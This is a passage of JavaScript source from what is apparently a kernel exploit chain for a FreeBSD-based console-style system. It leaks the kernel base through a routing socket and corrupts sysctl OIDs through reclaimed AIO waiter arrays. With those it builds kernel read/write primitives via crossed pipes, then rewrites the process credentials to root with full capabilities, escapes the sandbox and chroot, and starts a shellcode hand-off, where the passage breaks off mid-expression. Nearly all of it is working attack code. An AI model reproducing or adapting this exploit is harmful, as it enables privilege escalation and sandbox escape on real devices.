            return { rv, value: this.readU32(value, 0) | 0 };
          }
          async sysctlWriteInt(mib, value) {
            const buffer = this.alloc(8);
            this.writeU32(buffer, 0, value >>> 0);
            return (await this.sysctl(mib, 0, 0, buffer, 4)).rv;
          }
          async nameToMib(name) {
            const nameBuf = this.alloc(name.length + 1);
            for (let i = 0; i < name.length; i++)
              this.writeU8(nameBuf, i, name.charCodeAt(i));
            const out = this.alloc(0x60);
            const { rv, len } = await this.sysctl([0, 3], out, 0x60, nameBuf, name.length);
            if (rv !== 0) return null;
            const mib = [];
            for (let i = 0; i < len >>> 2; i++) mib.push(this.readU32(out, i * 4) | 0);
            return mib;
          }
          async oidKind(mib) {
            const out = this.alloc(0x100);
            const { rv } = await this.sysctl([0, 4].concat(mib), out, 0x100, 0, 0);
            return rv === 0 ? this.readU32(out, 0) >>> 0 : null;
          }
          async firstInterfaceAddress() {
            const RECORD = 0x3c0,
              IP = 40;
            const count = await this.sysInt(SYS_NETGETIFLIST, 0, 10);
            if (count <= 0 || count > 256) return null;
            const list = this.alloc(RECORD * count);
            if ((await this.sysInt(SYS_NETGETIFLIST, list, count)) < 0) return null;
            for (let i = 0; i < count; i++) {
              const octets = [0, 1, 2, 3].map((b) =>
                this.readU8(list, RECORD * i + IP + b),
              );
              if (octets.some((o) => o !== 0)) return octets;
            }
            return null;
          }
          async leakKernelBase() {
            const sockaddrLen = (len) => (len ? ((len - 1) & ~7) + 8 : 8);
            const DST_LEN = 88;
            const AUTHOR = 152 + sockaddrLen(DST_LEN);
            const MSG_LEN = AUTHOR + 256;
            const AUTHOR_INDEX = 6;
            const RET_SLOT = 184;
            const dst = await this.firstInterfaceAddress();
            if (!dst) throw new Error("kaslr: no interface has an address");
            const fd = await this.sysInt(SYS_SOCKET, AF_ROUTE, SOCK_RAW, 0);
            if (fd < 0) throw new Error("kaslr: routing socket is gated");
            this.fds.push(fd);
            const timeout = this.alloc(16);
            this.writeU32(timeout, 0, 5);
            await this.sysInt(SYS_SETSOCKOPT, fd, 0xffff, 0x20, timeout, 16);
            const msg = this.alloc(512);
            this.writeU8(msg, 0, MSG_LEN & 0xff);
            this.writeU8(msg, 1, (MSG_LEN >>> 8) & 0xff);
            this.writeU8(msg, 2, 5); // RTM_VERSION
            this.writeU8(msg, 3, 0x04); // RTM_GET
            this.writeU32(msg, 12, 0x41); // RTA_DST | RTA_AUTHOR
            this.writeU32(msg, 20, 0x1234); // rtm_seq
            this.writeU8(msg, 152, DST_LEN);
            this.writeU8(msg, 153, AF_INET);
            this.writeU32(msg, 156, (dst[3] << 24) | (dst[2] << 16) | (dst[1] << 8) | dst[0]);
            this.writeU8(msg, AUTHOR + 0, 255);
            this.writeU8(msg, AUTHOR + 1, AF_INET6);
            if ((await this.sysInt(SYS_WRITE, fd, msg, MSG_LEN)) < 0)
              throw new Error("kaslr: routing socket rejected the request");
            const reply = this.alloc(4096);
            let len = 0;
            for (let attempt = 0; attempt < 8 && len <= 0; attempt++) {
              len = await this.sysInt(SYS_RECVFROM, fd, reply, 4096, MSG_DONTWAIT, 0, 0);
              if (len <= 0) await sleep(1);
            }
            if (len <= 0) throw new Error("kaslr: no routing reply");
            const present = this.readU32(reply, 12) | 0;
            let cursor = 152,
              author = 0;
            for (let i = 0; i < 8; i++) {
              if (!(present & (1 << i))) continue;
              if (cursor + 2 > len) break;
              if (i === AUTHOR_INDEX) {
                author = cursor;
                break;
              }
              cursor += sockaddrLen(this.readU8(reply, cursor));
            }
            if (!author || author + 200 > len)
              throw new Error("kaslr: reply carries no author record");
            const { retStatic, retLow16 } = this.off.kaslr;
            const ret = this.readU64(reply, author + RET_SLOT);
            if (ret.hi !== 0xffffffff || (ret.low & 0xffff) !== (retLow16 & 0xffff))
              throw new Error("kaslr: author+" + RET_SLOT + " = 0x" + ret.toString() + " is not the expected return address");
            this.kbase = new int64((ret.low - retStatic) >>> 0, ret.hi);
          }
          async raiseFdLimit() {
            const limit = this.alloc(0x10);
            if ((await this.sysInt(SYS_GETRLIMIT, RLIMIT_NOFILE, limit)) === -1) return;
            this.writeU64(limit, 0, this.readU64(limit, 8));
            await this.sysInt(SYS_SETRLIMIT, RLIMIT_NOFILE, limit);
          }
          async openSocketPair(buffer, error) {
            this.clear(buffer, 8);
            if ((await this.sysInt(SYS_SOCKETPAIR, AF_UNIX, SOCK_STREAM, 0, buffer)) === -1)
              throw new Error(error);
            const pair = {
              readFd: this.readU32(buffer, 0),
              writeFd: this.readU32(buffer, 4),
            };
            this.fds.push(pair.readFd, pair.writeFd);
            return pair;
          }
          async submitBlockedRead(request, sink, readFd, idOut) {
            this.clear(request, 0x40);
            this.writeU32(request, 0x08, 1);
            this.writeU64(request, 0x10, sink);
            this.writeU32(request, 0x20, readFd);
            const rv = await this.sysInt(SYS_AIO_SUBMIT_CMD, AIO_CMD_READ, request, 1, 3, idOut);
            return rv === 0 ? this.readU32(idOut, 0) : null;
          }
          async parkAioWorkers(limit) {
            const pairBuffer = this.alloc(8);
            const pair = await this.openSocketPair(pairBuffer, "socketpair for the worker park failed");
            this.workerPark = pair;
            const sink = this.alloc(0x40);
            const request = this.alloc(0x40);
            const ids = this.alloc(4 * limit + 8);
            const states = this.alloc(4 * limit + 8);
            const idOut = this.alloc(8);
            let sent = 0;
            let parked = 0;
            let quietRounds = 0;
            while (sent < limit && quietRounds < 2) {
              for (let i = 0; i < 4 && sent < limit; i++) {
                const id = await this.submitBlockedRead(request, sink, pair.readFd, idOut);
                if (id === null) return;
                this.writeU32(ids, sent * 4, id);
                (this.parkedIds || (this.parkedIds = [])).push(id);
                sent++;
              }
              await sleep(60);
              await this.sysInt(SYS_AIO_MULTI_POLL, ids, sent, states);
              let inFlight = 0;
              for (let i = 0; i < sent; i++)
                if ((this.readU32(states, i * 4) & 0xffff) === 2) inFlight++;
              if (inFlight === parked) quietRounds++;
              else {
                parked = inFlight;
                quietRounds = 0;
              }
            }
          }
          async waitForPendingRequests(candidateIds, candidateCount, wantedCount) {
            const pollId = this.alloc(4);
            const pollState = this.alloc(4);
            const pendingIndices = [];
            const seen = new Set();
            for (let attempt = 0; attempt < 150 && pendingIndices.length < wantedCount; attempt++) {
              for (let index = 0; index < candidateCount && pendingIndices.length < wantedCount; index++) {
                if (seen.has(index)) continue;
                this.writeU32(pollId, 0, this.readU32(candidateIds, index * 4));
                await this.sysInt(SYS_AIO_MULTI_POLL, pollId, 1, pollState);
                if ((this.readU32(pollState, 0) & 0xffff) === 1) {
                  pendingIndices.push(index);
                  seen.add(index);
                }
              }
              if (pendingIndices.length < wantedCount) await sleep(20);
            }
            if (pendingIndices.length !== wantedCount)
              throw new Error(`${pendingIndices.length}/${wantedCount} requests stayed pending`);
            return pendingIndices;
          }
          async claimPendingRequests(count) {
            const candidateCount = Math.max(count + 8, 0x18);
            const candidateIds = this.alloc(4 * candidateCount);
            const request = this.alloc(0x40);
            const sink = this.alloc(0x40);
            const pairBuffer = this.alloc(8);
            const idOut = this.alloc(4);
            for (let index = 0; index < candidateCount; index++) {
              const pair = await this.openSocketPair(pairBuffer, "socketpair failed while claiming requests");
              const id = await this.submitBlockedRead(request, sink, pair.readFd, idOut);
              if (id === null) throw new Error("aio request submission failed");
              this.writeU32(candidateIds, index * 4, id);
            }
            const pending = await this.waitForPendingRequests(candidateIds, candidateCount, count);
            const ids = this.alloc(4 * count);
            pending.forEach((index, output) => {
              this.writeU32(ids, output * 4, this.readU32(candidateIds, index * 4));
            });
            return { ids, count };
          }
          buildWaiterNodes(count, firstTarget, secondTarget) {
            const nodes = this.alloc(count * this.off.aio.requestSize);
            for (let i = 0; i < count; i++)
              this.writeU32(nodes, i * this.off.aio.requestSize + 0x20, 0xffffffff);
            this.writeU64(nodes, 0x00, firstTarget);
            this.writeU64(nodes, 0x08, secondTarget);
            this.writeU64(nodes, 0x10, this.kaddr(this.off.nodeMutex));
            return nodes;
          }
          rememberArmedGroup(group) {
            const ids = [];
            for (let index = 0; index < group.count; index++)
              ids.push(this.readU32(group.ids, index * 4) >>> 0);
            this.armedGroups.push(ids);
          }
          async runReclaimBatch(group, nodes) {
            const { requests, churnBefore, churnAfter, sprays, waitTimeoutUs } = this.tuning;
            const requestSize = this.off.aio.requestSize;
            const sprayedIds = this.alloc(4 * requests * (sprays + 1));
            const returns = this.alloc(8 * (sprays + 1));
            const timeout = this.alloc(16);
            this.writeU32(timeout, 0, waitTimeoutUs);
            const churnRequest = (0x80000000 | ((requests * requestSize) << 16) | 0x4101) >>> 0;
            const preflight = await this.sysInt(SYS_IOCTL, 0xffffffff, churnRequest, nodes);
            if (preflight !== -1) return null;
            this.chain.clear();
            for (let i = 0; i < churnBefore; i++)
              this.chain.add_syscall(SYS_IOCTL, 0xffffffff, churnRequest, nodes);
            this.chain.add_syscall(SYS_AIO_MULTI_WAIT, group.ids, group.count, this.scratch.states, 0, timeout);
            for (let i = 0; i < churnAfter; i++)
              this.chain.add_syscall(SYS_IOCTL, 0xffffffff, churnRequest, nodes);
            for (let i = 0; i < sprays; i++)
              this.chain.add_syscall_ret(returns.add32(i * 8), SYS_AIO_SUBMIT_CMD, AIO_CMD_READ, nodes, requests, 3, sprayedIds.add32(i * 4 * requests));
            await this.chain.run();
            let accepted = 0;
            for (let i = 0; i < sprays; i++)
              if ((this.readU32(returns, i * 8) | 0) === 0) accepted++;
            return accepted;
          }
          async cancelRequest(group, index) {
            return this.sysInt(SYS_AIO_MULTI_CANCEL, group.ids.add32(index * 4), 1, this.scratch.states);
          }
          async firstPendingRequest(group) {
            await this.sysInt(SYS_AIO_MULTI_POLL, group.ids, group.count, this.scratch.states);
            for (let index = 0; index < group.count; index++) {
              const state = this.readU32(this.scratch.states, index * 4) & 0xffff;
              if (state !== 1) continue;
              const canary = group.count - 1;
              if (canary !== index) await this.cancelRequest(group, canary);
              return index;
            }
            return -1;
          }
          async reclaimWaiterArray(tag, firstTarget, secondTarget) {
            const { waiters, requests, sprays } = this.tuning;
            const group = await this.claimPendingRequests(waiters);
            this.rememberArmedGroup(group);
            const nodes = this.buildWaiterNodes(requests, firstTarget, secondTarget);
            const accepted = await this.runReclaimBatch(group, nodes);
            if (accepted === null) {
              this.report(tag, "invalid churn request");
              return null;
            }
            if (accepted !== sprays) {
              this.report(tag, `${sprays - accepted} reclaim submits failed`);
              return null;
            }
            const firstPending = await this.firstPendingRequest(group);
            if (firstPending < 0) {
              this.report(tag, "no pending request is available");
              return null;
            }
            return { group, firstPending, heads: group.count - 1 };
          }
          async flipOidKind(tag, reclaim, mib, target) {
            let kind = await this.oidKind(mib);
            if (kind === null) {
              this.report(tag, "oid is hidden before the flip");
              return false;
            }
            for (let i = 0; i < reclaim.heads && kind !== target; i++) {
              await this.cancelRequest(reclaim.group, i);
              const next = await this.oidKind(mib);
              if (next === null) {
                this.report(tag, "oid disappeared during the flip");
                return false;
              }
              kind = next;
              if (((kind >>> 24) & 0xff) < ((target >>> 24) & 0xff)) {
                this.report(tag, "oid flip overshot into oid_arg1");
                return false;
              }
            }
            if (kind !== target) {
              this.report(tag, "not enough waiter heads");
              return false;
            }
            return true;
          }
          async setWindowLow(value) {
            return this.sysctlWriteInt(this.mibA, value >>> 0);
          }
          async setWindowHigh(value) {
            if (this.mibC) return this.sysctlWriteInt(this.mibC, value >>> 0);
            if (this.windowHigh !== 0xffffffff) return -1;
            const selfHigh = this.kaddr(this.off.oid.b.arg1 + 4);
            const rv = await this.setWindowLow(selfHigh.low);
            return rv !== 0 ? rv : this.sysctlWriteInt(this.mibB, value >>> 0);
          }
          async aimWindow(address) {
            const high = address.hi >>> 0;
            if (this.windowHigh !== high) {
              const rv = await this.setWindowHigh(high);
              if (rv !== 0) return rv;
              this.windowHigh = high;
            }
            return this.setWindowLow(address.low);
          }
          async kread32(address) {
            if ((await this.aimWindow(address)) !== 0) return { rv: -1, value: 0 };
            const { rv, value } = await this.sysctlReadInt(this.mibB);
            return { rv, value: value >>> 0 };
          }
          async kwrite32(address, value) {
            if ((await this.aimWindow(address)) !== 0) return -1;
            return this.sysctlWriteInt(this.mibB, value >>> 0);
          }
          async kread64(address) {
            const low = await this.kread32(address);
            const high = await this.kread32(address.add32(4));
            return { rv: low.rv | high.rv, value: new int64(low.value, high.value) };
          }
          async kwrite64(address, value) {
            const rv = await this.kwrite32(address, value.low);
            return rv !== 0 ? rv : this.kwrite32(address.add32(4), value.hi);
          }
          async prepareHighWriter() {
            const { c, b, writableKind } = this.off.oid;
            if (this.windowHigh !== 0xffffffff) {
              this.report("kernel rw", "writer window already left the kernel image");
              return false;
            }
            if ((await this.kwrite32(this.kaddr(c.kind), writableKind)) !== 0)
              return false;
            if ((await this.kwrite64(this.kaddr(c.arg1), this.kaddr(b.arg1 + 4))) !== 0)
              return false;
            const probe = await this.sysctlReadInt(c.mib);
            if (probe.rv !== 0 || (probe.value >>> 0) !== 0xffffffff) {
              this.report("kernel rw", "high writer self-test failed");
              return false;
            }
            this.mibC = c.mib;
            return true;
          }
          async makeOidWritable(tag, mib, kindByte) {
            const { a, originalKind, writableKind } = this.off.oid;
            const kind = await this.oidKind(mib);
            if (kind !== originalKind) {
              this.report(tag, `unexpected oid kind ${kind === null ? "missing" : kind.toString(16)}`);
              return false;
            }
            const reclaim = await this.reclaimWaiterArray(tag, this.kaddr(a.deadSink), this.kaddr(kindByte));
            if (!reclaim) return false;
            return this.flipOidKind(tag, reclaim, mib, writableKind);
          }
          async steerOidWindow() {
            const { a, b } = this.off.oid;
            if ((await this.oidKind(this.mibB)) !== null) {
              this.report("Kernel", "oid is already visible");
              return false;
            }
            const aValue = await this.sysctlReadInt(this.mibA);
            if (aValue.rv !== 0) {
              this.report("Kernel", "steering oid is not readable");
              return false;
            }
            const reclaim = await this.reclaimWaiterArray("Kernel", this.kaddr(a.arg1Byte1), this.kaddr(b.visible));
            if (!reclaim) return false;
            await this.cancelRequest(reclaim.group, reclaim.firstPending);
            const steered = await this.sysctlReadInt(this.mibA);
            const expected = this.kaddr(b.arg1Value).low >>> 0;
            if (steered.rv !== 0 || steered.value >>> 0 !== expected) {
              this.report("Kernel", "oid steering check failed");
              return false;
            }
            this.windowHigh = 0xffffffff;
            return true;
          }
          async testKernelRead() {
            const b = this.off.oid.b;
            const kindViaOidfmt = await this.oidKind(this.mibB);
            const kindViaRead = await this.kread32(this.kaddr(b.kind));
            const ok = kindViaOidfmt !== null && kindViaRead.rv === 0 && kindViaRead.value === kindViaOidfmt;
            if (!ok) this.report("Kernel", "read self-test failed");
            return ok;
          }
          async testKernelWrite() {
            const counter = this.kaddr(this.off.walkCounter.addr);
            const mib = this.off.walkCounter.mib;
            const before = await this.sysctlReadInt(mib);
            const rv = await this.kwrite32(counter, 0x41424344);
            const after = await this.sysctlReadInt(mib);
            const ok = rv === 0 && after.value >>> 0 === 0x41424344;
            if (ok) await this.kwrite32(counter, before.value >>> 0);
            else this.report("Kernel", "write self-test failed");
            return ok;
          }
          async armKernelReadWrite() {
            const { a, b } = this.off.oid;
            this.mibA = await this.nameToMib("kern.smp.cpus");
            this.mibB = await this.nameToMib("kern.smp.maxcpus");
            if (!this.mibA || !this.mibB || (await this.oidKind(this.mibA)) !== this.off.oid.originalKind) {
              this.report("Kernel", "unexpected oid state");
              return false;
            }
            await this.raiseFdLimit();
            await this.parkAioWorkers(this.tuning.workerBlockers);
            if (!(await this.makeOidWritable("arm a", this.mibA, a.kindByte3))) return false;
            if (!(await this.steerOidWindow())) return false;
            if (!(await this.testKernelRead())) return false;
            if (!(await this.makeOidWritable("arm c", this.mibB, b.kindByte3))) return false;
            if (!(await this.testKernelWrite())) return false;
            return this.prepareHighWriter();
          }
          async findProcess(targetPid) {
            const head = await this.readKernelPointer(this.kaddr(this.off.allproc));
            if (!head) {
              this.report("Process", "allproc is not a kernel pointer");
              return null;
            }
            let proc = head;
            for (let hop = 0; hop < 4096; hop++) {
              const pid = await this.kread32(proc.add32(this.off.proc.pid));
              if (pid.rv !== 0) return null;
              if ((pid.value | 0) < 0 || (pid.value | 0) > 0x40000) {
                this.report("Process", "invalid pid while walking allproc");
                return null;
              }
              if ((pid.value | 0) === targetPid) return proc;
              const next = await this.readKernelPointer(proc);
              if (!next) return null;
              proc = next;
            }
            return null;
          }
          async findCurrentProcess() {
            const myPid = await this.sysInt(SYS_GETPID);
            const proc = await this.findProcess(myPid);
            if (!proc) {
              this.report("Process", "current process is not in allproc");
              return false;
            }
            this.curproc = proc;
            const fd = await this.kread64(this.curproc.add32(this.off.proc.fd));
            if (this.isKernelPointer(fd.value)) this.procFdAddr = fd.value;
            const aioInfo = await this.kread64(this.curproc.add32(this.off.proc.aioInfo));
            const ucred = await this.kread64(this.curproc.add32(this.off.proc.ucred));
            if (this.isKernelPointer(ucred.value)) this.ucred = ucred.value;
            const ok = aioInfo.rv === 0 && this.isKernelPointer(aioInfo.value);
            if (ok) this.report("aio_info_addr", "0x" + aioInfo.value.toString(), "info");
            else this.report("Process", "aio info pointer is invalid");
            if (this.ucred) this.report("ucred_addr", "0x" + this.ucred.toString(), "info");
            return ok;
          }
          async fileOf(fd) {
            const isKptr = (v) => !!v && (v.hi >>> 16) === 0xffff;
            const rdPtr = async (addr) => {
              const v = await this.readKernel64(addr);
              return isKptr(v) ? v : null;
            };
            const fdp = await rdPtr(this.curproc.add32(this.off.proc.fd));
            if (!fdp) return null;
            const table = await rdPtr(fdp.add32(this.off.filedesc.files));
            if (!table) return null;
            const entry = this.off.filedescTable.ofiles + fd * this.off.filedescTable.entryStride;
            return rdPtr(table.add32(entry));
          }
          async findPipe(fdp, fd, label) {
            const table = await this.readKernelPointer(fdp.add32(this.off.filedesc.files));
            if (!table) {
              this.report("Pipes", label + " file table is invalid");
              return null;
            }
            const count = await this.kread32(table.add32(this.off.filedescTable.nfiles));
            if (count.rv !== 0 || fd >= count.value) {
              this.report("Pipes", label + " descriptor is outside the file table");
              return null;
            }
            const entry = this.off.filedescTable.ofiles + fd * this.off.filedescTable.entryStride;
            const file = await this.readKernelPointer(table.add32(entry));
            if (!file) {
              this.report("Pipes", label + " file pointer is invalid");
              return null;
            }
            const pipe = await this.readKernelPointer(file.add32(this.off.filedescTable.fileData));
            if (!pipe) {
              this.report("Pipes", label + " pipe pointer is invalid");
              return null;
            }
            const pair = await this.kread64(pipe.add32(this.off.pipe.pair));
            const isReadEnd = pair.rv === 0 && pair.value.hi === pipe.hi && pair.value.low === pipe.low;
            return { pipe, isReadEnd };
          }
          async locatePipes() {
            const fdp = await this.readKernelPointer(this.curproc.add32(this.off.proc.fd));
            if (!fdp) {
              this.report("Pipes", "process file table is invalid");
              return false;
            }
            const pair = this.alloc(16);
            const probe = this.alloc(8);
            const located = [];
            for (const label of ["master", "victim"]) {
              this.clear(pair, 16);
              if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
                this.report("Pipes", "could not create the " + label + " pipe");
                return false;
              }
              const readFd = this.readU32(pair, 0) | 0;
              const writeFd = this.readU32(pair, 4) | 0;
              this.fds.push(readFd, writeFd);
              const info = await this.findPipe(fdp, readFd, label);
              if (!info) return false;
              if (!info.isReadEnd) {
                this.report("Pipes", label + " pipe self-check failed");
                return false;
              }
              this.writeU32(probe, 0, 0x5a);
              await this.sysInt(SYS_WRITE, writeFd, probe, 1);
              const count = await this.kread32(info.pipe.add32(this.off.pipe.count));
              if (count.value !== 1) {
                this.report("Pipes", label + " pipe counter check failed");
                return false;
              }
              located.push({ readFd, writeFd, pipe: info.pipe });
            }
            [this.master, this.victim] = located;
            return true;
          }
          async aimVictim(address, count, size) {
            const { count: C, size: S, buffer: B } = this.off.pipe;
            this.clear(this.aimBuffer, 0x18);
            this.writeU32(this.aimBuffer, C, count >>> 0);
            this.writeU32(this.aimBuffer, S, size >>> 0);
            this.writeU64(this.aimBuffer, B, address);
            const written = await this.sysInt(SYS_WRITE, this.master.writeFd, this.aimBuffer, 0x18);
            const drained = await this.sysInt(SYS_READ, this.master.readFd, this.drainBuffer, 0x18);
            return written === 0x18 && drained === 0x18 ? 0 : -1;
          }
          async kreadFast(address, length, dest) {
            if ((await this.aimVictim(address, length, this.pipeSize)) !== 0) return -1;
            return this.sysInt(SYS_READ, this.victim.readFd, dest, length);
          }
          async kwriteFast(address, length, src) {
            if ((await this.aimVictim(address, 0, this.pipeSize)) !== 0) return -1;
            return this.sysInt(SYS_WRITE, this.victim.writeFd, src, length);
          }
          async readKernel32(address) {
            const buffer = this.scratch.qword;
            return (await this.kreadFast(address, 4, buffer)) === 4
              ? this.readU32(buffer, 0) >>> 0
              : -1;
          }
          async readKernel64(address) {
            const buffer = this.scratch.qword;
            return (await this.kreadFast(address, 8, buffer)) === 8
              ? this.readU64(buffer, 0)
              : new int64(0, 0);
          }
          async writeKernel32(address, value) {
            const buffer = this.scratch.qword;
            this.writeU32(buffer, 0, value);
            return (await this.kwriteFast(address, 4, buffer)) === 4;
          }
          async writeKernel64(address, value, high) {
            const buffer = this.scratch.qword;
            this.writeU32(buffer, 0, value.low === undefined ? value : value.low);
            this.writeU32(buffer, 4, value.hi === undefined ? high : value.hi);
            return (await this.kwriteFast(address, 8, buffer)) === 8;
          }
          async crossPipes() {
            const master = this.master.pipe;
            const victim = this.victim.pipe;
            const { count, in: inOff, out: outOff, size, buffer } = this.off.pipe;
            this.pipeSize = this.off.pipe.defaultSize;
            if ((typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) ||
                (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER))
              await this.savePipeBuffers();
            this.aimBuffer = this.alloc(0x20);
            this.drainBuffer = this.alloc(0x40);
            const inValue = await this.kread32(master.add32(inOff));
            const outValue = await this.kread32(master.add32(outOff));
            if (inValue.rv !== 0 || inValue.value !== 1 || outValue.value !== 0) {
              this.report("pipes", "master pipe is not in the expected state");
              return false;
            }
            await this.sysInt(SYS_READ, this.master.readFd, this.drainBuffer, 1);
            const fields = [
              [count, 0],
              [inOff, 0],
              [outOff, 0],
              [size, this.pipeSize],
              [buffer, victim.low >>> 0],
              [buffer + 4, victim.hi >>> 0],
            ];
            for (const [offset, value] of fields) {
              let ok = false;
              for (let attempt = 0; attempt < 3 && !ok; attempt++) {
                await this.kwrite32(master.add32(offset), value);
                const readBack = await this.kread32(master.add32(offset));
                ok = readBack.rv === 0 && readBack.value === value >>> 0;
              }
              if (!ok) {
                this.report("Pipes", "could not update the master pipe");
                return false;
              }
            }
            this.crossed = true;
            const { rva, text } = this.off.rodataProbe;
            const out = this.alloc(0x40);
            const got = await this.kreadFast(this.kaddr(rva), text.length, out);
            let read = "";
            for (let i = 0; i < text.length; i++)
              read += String.fromCharCode(this.readU8(out, i));
            const match = got === text.length && read === text;
            if (!match) this.report("Pipes", "kernel read check failed");
            return match;
          }
          async escalate() {
            if (!this.crossed || !this.ucred) {
              this.report("Privileges", "kernel rw or credentials are missing");
              return false;
            }
            const rootvnode = await this.readKernelPointer(this.kaddr(this.off.rootvnode));
            if (!rootvnode) {
              this.report("Privileges", "could not find rootvnode");
              return false;
            }
            const { ucred, sysCoreAuthId, filedesc, dynlib, proc } = this.off;
            const cred = this.ucred;
            await this.writeKernel32(cred.add32(ucred.uid), 0);
            await this.writeKernel32(cred.add32(ucred.ruid), 0);
            await this.writeKernel32(cred.add32(ucred.svuid), 0);
            await this.writeKernel32(cred.add32(ucred.ngroups), 1);
            await this.writeKernel32(cred.add32(ucred.rgid), 0);
            await this.writeKernel32(cred.add32(ucred.svgid), 0);
            await this.writeKernel64(cred.add32(ucred.sceAuthId), sysCoreAuthId.lo, sysCoreAuthId.hi);
            await this.writeKernel64(cred.add32(ucred.sceCaps), 0xffffffff, 0xffffffff);
            await this.writeKernel64(cred.add32(ucred.sceCaps1), 0xffffffff, 0xffffffff);
            const attrsLow = await this.readKernel32(cred.add32(ucred.sceAttrs));
            const attrsHigh = await this.readKernel32(cred.add32(ucred.sceAttrs + 4));
            await this.writeKernel64(cred.add32(ucred.sceAttrs), ((attrsLow & 0x00ffffff) | 0x80000000) >>> 0, attrsHigh);
            const fdp = (await this.kread64(this.curproc.add32(proc.fd))).value;
            await this.writeKernel64(fdp.add32(filedesc.cdir), rootvnode);
            await this.writeKernel64(fdp.add32(filedesc.rdir), rootvnode);
            await this.writeKernel64(fdp.add32(filedesc.jdir), 0, 0);
            const dynlibPtr = await this.kread64(this.curproc.add32(proc.dynlib));
            if (this.isKernelPointer(dynlibPtr.value)) {
              await this.writeKernel64(dynlibPtr.value.add32(dynlib.syscallStart), 0, 0);
              await this.writeKernel64(dynlibPtr.value.add32(dynlib.syscallEnd), 0xffffffff, 0xffffffff);
              await this.writeKernel32(dynlibPtr.value.add32(dynlib.restrictFlags), 0);
              await this.writeKernel64(dynlibPtr.value.add32(dynlib.libkernelRef), 1, 0);
            } else {
              this.report("Privileges", "dynlib pointer is invalid");
            }
            const uidAfter = await this.sysInt(SYS_GETUID);
            const sandboxAfter = await this.sysInt(SYS_IS_IN_SANDBOX);
            const ok = uidAfter === 0 && sandboxAfter === 0;
            if (!ok) this.report("Privileges", "uid or sandbox check failed");
            return ok;
          }
          async lookupAioGroup(table, id) {
            const { pages, slotStride, entryType } = this.off.aio.idTable;
            const index = id & 0x1fff;
            const pageCount = await this.kread32(table.add32(pages));
            if (pageCount.rv !== 0 || pageCount.value === 0 || pageCount.value > 64)
              return null;
            if (index >= pageCount.value << 7)
              return null;
            const page = await this.readKernelPointer(table.add32((index >>> 7) * 8));
            if (!page) return null;
            const slot = page.add32((id & 0x7f) * slotStride);
            const generation = await this.kread32(slot.add32(0x28));
            if (generation.rv !== 0) return null;
            if (((((generation.value & 0xffff) << 13) | index) & 0xffff) !== id)
              return null;
            const state = await this.kread32(slot.add32(0x24)); // free_next | state<<16
            if (state.rv !== 0 || state.value >>> 16 !== 3) return null;
            const type = await this.kread32(slot.add32(0x20));
            if (type.rv !== 0 || (type.value & 0xffff) !== entryType)
              return null;
            return this.readKernelPointer(slot.add32(0x10));
          }
          async defuseAioGroups() {
            if (!this.curproc) {
              this.report("cleanup", "current process is missing");
              return false;
            }
            const table = (await this.kread64(this.curproc.add32(this.off.proc.aioInfo))).value;
            if (!this.isKernelPointer(table)) {
              this.report("cleanup", "aio table pointer is invalid");
              return false;
            }
            const { num, state, waiters } = this.off.aio.group;
            let total = 0,
              alreadyClear = 0,
              cleared = 0,
              skipped = 0,
              failed = 0;
            for (const ids of this.armedGroups) {
              for (const id of ids) {
                total++;
                const group = await this.lookupAioGroup(table, id);
                if (!group) {
                  skipped++;
                  continue;
                }
                const shared = await this.readKernelPointer(group.add32(0x10));
                if (!shared) {
                  skipped++;
                  continue;
                }
                const groupNum = await this.kread32(shared.add32(num));
                const groupState = await this.kread32(shared.add32(state));
                if (groupNum.value !== 1 || groupState.value < 1 || groupState.value > 4) {
                  skipped++;
                  continue;
                }
                const head = await this.kread64(shared.add32(waiters));
                if (head.value.low === 0 && head.value.hi === 0) {
                  alreadyClear++;
                  continue;
                }
                if (typeof AIO_DUMP_WAITERS !== "undefined" && AIO_DUMP_WAITERS &&
                    this.isKernelPointer(head.value) && this._waiterDumps < 3) {
                  this._waiterDumps++;
                  const words = [];
                  for (let off = 0; off < 0x40; off += 8) {
                    const w = await this.kread64(head.value.add32(off));
                    words.push("+" + off.toString(16) + "=" +
                      (w.rv === 0 ? "0x" + w.value.toString() : "?"));
                  }
                  this.report("aio-waiters", "group id " + id + " array @ 0x" +
                    head.value.toString() + " (kbase 0x" + this.kbase.toString() +
                    ", nodeMutex 0x" + this.kaddr(this.off.nodeMutex).toString() + ")");
                  this.report("aio-waiters", "  " + words.join(" "));
                }
                let ok = false;
                for (let attempt = 0; attempt < 3 && !ok; attempt++) {
                  await this.kwrite32(shared.add32(waiters), 0);
                  await this.kwrite32(shared.add32(waiters + 4), 0);
                  const back = await this.kread64(shared.add32(waiters));
                  ok = back.value.low === 0 && back.value.hi === 0;
                }
                if (ok) cleared++;
                else failed++;
              }
            }
            const ok = skipped === 0 && failed === 0 && cleared + alreadyClear === total;
            this.defused = true;
            if (!ok)
              this.report("cleanup", `aio cleanup failed (${skipped} skipped, ${failed} failed)`);
            return ok;
          }
          async launchShellcode() {
            await this.restoreThreadAttributes();
            if (typeof PREPARE_FOR_KEXP !== "undefined" && PREPARE_FOR_KEXP && this.crossed) {
              const isKptr = (v) => !!v && (v.hi >>> 16) === 0xffff;
              const rdPtr = async (addr) => {
                const v = await this.readKernel64(addr);
                return isKptr(v) ? v : null;
              };
              const dynlibPtr = await rdPtr(this.curproc.add32(this.off.proc.dynlib));
              if (!dynlibPtr) {
                await asay("handoff 0a: p_dynlib is not a kernel pointer - dlsym patch skipped");
              } else {
                const eboot = (typeof WIDEN_EBOOT === "undefined" || WIDEN_EBOOT)
                  ? await rdPtr(dynlibPtr.add32(0x00)) : null;
                const segments = eboot ? await rdPtr(eboot.add32(0x40)) : null;
                if (!eboot && typeof WIDEN_EBOOT !== "undefined" && !WIDEN_EBOOT) {
                  await asay("handoff 0a: eboot widening disabled by WIDEN_EBOOT");
                }
                if (segments) {
                  const origAddr = await this.readKernel64(segments.add32(0x08));
                  const origSize = await this.readKernel64(segments.add32(0x10));
                  const okAddr = await this.writeKernel64(segments.add32(0x08), 0, 0);
                  const okSize = await this.writeKernel64(segments.add32(0x10),
                    0xffffffff, 0xffffffff);
                  const back = await this.readKernel64(segments.add32(0x10));
                  if (okAddr && okSize) {
                    this.ebootSegments = segments;
                    this.ebootOrig = { addr: origAddr, size: origSize };
                  }
                  await asay("handoff 0a: eboot segments widened for dlsym (dynlib 0x" +
                    dynlibPtr.toString() + ", eboot 0x" + eboot.toString() +
                    ", segments 0x" + segments.toString() + ", wrote " +
